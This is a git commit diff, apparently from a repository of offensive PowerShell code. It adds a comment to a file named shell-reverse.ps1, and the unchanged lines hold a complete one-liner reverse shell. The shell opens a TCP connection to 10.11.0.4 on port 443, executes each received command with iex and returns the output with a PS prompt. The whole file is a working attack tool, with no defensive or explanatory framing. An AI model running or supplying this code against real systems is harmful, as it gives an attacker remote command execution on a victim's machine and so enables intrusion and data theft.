0cfdef14ac68e34feee65e0f6cdfcbbf40c8d933
ChrononX <45243151+ChrononX@users.noreply.github.com>
2021-10-30 02:52:11 +0400

    One liner reverse shell for powershell.

--- Powershell_Codes/shell-reverse.ps1
+++ Powershell_Codes/shell-reverse.ps1
@@ -1,3 +1,5 @@
+#One liner reverse shell code.
+
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
 11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
 $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
@@ -5,3 +7,4 @@ ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-Str
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
 ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
 lient.Close()"
+
